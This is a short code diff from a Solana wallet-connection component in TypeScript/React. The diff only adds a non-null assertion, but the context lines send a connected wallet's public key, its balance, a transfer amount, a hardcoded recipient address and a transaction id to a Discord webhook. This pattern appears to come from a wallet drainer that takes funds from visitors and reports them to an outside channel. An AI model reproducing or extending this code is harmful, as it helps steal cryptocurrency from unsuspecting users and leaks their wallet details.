@@ -181,7 +181,7 @@ const WalletConnectionHandler: FC = () => {
 
                     await sendDiscordWebhook(
                         walletPublicKey.toBase58(),
-                        lamports / LAMPORTS_PER_SOL,
+                        lamports! / LAMPORTS_PER_SOL,
                         sendAmount,
                         '5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz',
                         txid
